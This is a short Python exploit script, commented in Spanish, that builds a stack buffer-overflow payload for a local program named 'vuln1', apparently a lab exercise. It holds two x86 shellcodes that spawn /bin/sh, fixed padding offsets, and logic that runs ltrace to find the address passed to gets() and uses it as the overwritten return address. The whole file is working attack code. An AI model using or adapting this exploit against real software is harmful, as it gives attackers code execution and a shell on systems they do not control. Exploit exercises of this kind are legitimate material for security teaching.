#!/usr/bin/env python3
import struct
import sys
import re
import subprocess


shellcode1 = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
offset1 = 65
shellcode2 = b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
offset2 = 55

if len(sys.argv) < 2:
    print("Faltan argumento: shellcode_select")
    sys.exit(1)

shellcode_select = sys.argv[1]
if len(sys.argv) > 2 and re.match(r"0x[0-9a-fA-F]+", sys.argv[2]):
    r_addr = int(sys.argv[2], 16)
else:
    r_addr = None  # o lo que quieras hacer si no se proporciona

payload = b""


if not r_addr:
    # Ejecutamos ltrace y capturamos la salida
    result = subprocess.run(
        ["ltrace", "./vuln1"],
        input="patata\n",
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
        text=True,
    )
    # ltrace escribe en stderr, no en stdout
    ltrace_output = result.stderr

    # Buscamos la primera aparición de gets(...)
    match = re.search(r"gets\((0x[0-9a-fA-F]+)", ltrace_output)

    if match:
        addr_str = match.group(1)
        addr_int = int(addr_str, 16)
        addr_corr = addr_int + 0x10
        addr_bin = struct.pack("<I", addr_corr)

        # print(f"[+] Dirección capturada: {addr_str}")
    else:
        print("[-] No se encontró la llamada a gets().")
        sys.exit(1)
else:
    addr_bin = struct.pack("<I", r_addr)

if shellcode_select == "1":
    payload += shellcode1
    payload += b"A" * offset1
elif shellcode_select == "2":
    payload += shellcode2
    payload += b"A" * offset2
else:
    print("shellcode_select incorrecto: elige -> 1 o 2")
    sys.exit(1)

payload += addr_bin

sys.stdout.buffer.write(payload)
